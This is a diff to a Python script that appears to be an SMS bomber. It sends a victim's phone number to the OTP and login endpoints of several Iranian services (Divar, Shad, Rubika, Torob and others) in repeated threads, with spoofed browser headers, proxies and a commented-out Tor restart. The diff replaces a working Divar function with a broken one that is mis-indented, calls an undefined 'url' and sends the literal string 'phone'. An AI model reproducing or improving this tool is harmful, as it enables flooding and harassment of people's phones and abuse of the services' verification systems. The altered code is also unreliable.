@@ -20,6 +20,34 @@ def snap(phone):
     except:
         print ("Error!")
 
+def divar(phone):
+    #divar api
+    headers = {
+    "Accept": "application/json, text/plain, */*",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Accept-Language": "en-US,en;q=0.5",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Host": "api.divar.ir",
+    "Origin": "https://divar.ir",
+    "Referer": "https://divar.ir/",
+    "Sec-Fetch-Dest": "empty",
+    "Sec-Fetch-Mode": "cors",
+    "Sec-Fetch-Site": "same-site",
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0"
+}
+
+data = {"cellphone":"phone"}
+try:
+    response = requests.post(url, headers=headers, data=data)
+    if response.status_code == 200:
+        print("Success!")
+        print("Response:", response.text)
+    else:
+        print("Error! Status code:", response.status_code)
+except Exception as e:
+    print("An error occurred:", e)
+
+    
 def shad(phone):
     #shad api
     shadH = {"Host": "shadmessenger12.iranlms.ir","content-length": "96","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "text/plain","origin": "https://shadweb.iranlms.ir","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://shadweb.iranlms.ir/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
@@ -68,18 +96,6 @@ def emtiaz(phone):
     except:
         print ("Error!")
 
-def divar(phone):
-    #divar api
-    divarH = {"Host": "api.divar.ir","Connection": "keep-alive","Content-Length": "22","Accept": "application/json, text/plain, */*","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded","Origin": "https://divar.ir","Sec-Fetch-Site": "same-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://divar.ir/my-divar/my-posts","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
-    divarD = {"phone":phone.split("+98")[1]}
-    try:
-        divarR = requests.post("https://api.divar.ir/v5/auth/authenticate", headers=divarH, json=divarD, proxies=proxy)
-        if "SENT" in divarR.text:
-            print ("sended sms:)")
-        else:
-            print ("Error!")
-    except:
-        print ("Error!")
 
 def rubika(phone):
     #rubika api
@@ -131,11 +147,11 @@ def main():
         Thread(target=rubika, args=[phone]).start()
         Thread(target=torob, args=[phone]).start()
         Thread(target=bama, args=[phone]).start()
+
         # os.system("killall -HUP tor")
         time.sleep(3)
 
 
 if __name__ == "__main__":
     main()
-
 
